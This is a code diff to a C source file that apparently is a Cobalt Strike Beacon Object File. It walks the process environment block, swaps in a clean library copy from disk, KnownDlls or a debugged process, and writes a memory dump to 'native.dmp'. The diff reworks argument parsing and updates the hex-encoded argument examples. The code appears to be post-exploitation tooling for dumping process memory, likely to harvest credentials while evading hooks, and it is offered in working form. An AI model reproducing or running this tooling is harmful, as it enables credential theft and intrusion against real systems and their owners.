@@ -202,7 +202,7 @@ void* GetModuleAddr() {
     // PEB
     PVOID peb_pointer = (PVOID)((BYTE*)pbi_addr + peb_offset);
     PVOID pebaddress = *(PVOID*)peb_pointer;
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] PEB Address: \t\t0x%p\n", pebaddress);
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] PEB Address: \t\t0x%p\n", pebaddress);
 
     // PEB->Ldr
     void* ldr_pointer = (void*)((uintptr_t)pebaddress + ldr_offset);
@@ -1001,21 +1001,18 @@ char* get_dump_bytearr(OSVERSIONINFOW osvi, ModuleInformation* moduleinfo_arr, i
 }
 
 
-void go(IN PCHAR Buffer, IN ULONG Length) {
+void go(char *args, int length) {
     // Get first argument value
-    //      - disk:        0e0000000a0000006400690073006b000000
-    //      - knowndlls:   18000000140000006b006e006f0077006e0064006c006c0073000000
-    //      - debugproc:   180000001400000064006500620075006700700072006f0063000000
-    datap parser;
-    wchar_t *option_w = NULL;
-    BeaconDataParse(&parser, Buffer, Length);
-    option_w = (wchar_t *)BeaconDataExtract(&parser, NULL);
-    HANDLE hHeap = KERNEL32$GetProcessHeap();
-    char* option = "";
-    if(option_w != NULL){
-        option = ConvertUnicodeToAnsi(hHeap, option_w);
+    //      - disk:        09000000050000006469736b00
+    //      - knowndlls:   0e0000000a0000006b6e6f776e646c6c7300
+    //      - debugproc:   0e0000000a000000646562756770726f6300    
+    datap  parser;
+    char * option;
+    BeaconDataParse(&parser, args, length);
+    option = BeaconDataExtract(&parser, NULL);
+    if (option){
+        ReplaceLibrary(option);
     }
-    ReplaceLibrary(option);
 
     // File names
     char* dump_fname = "native.dmp";    
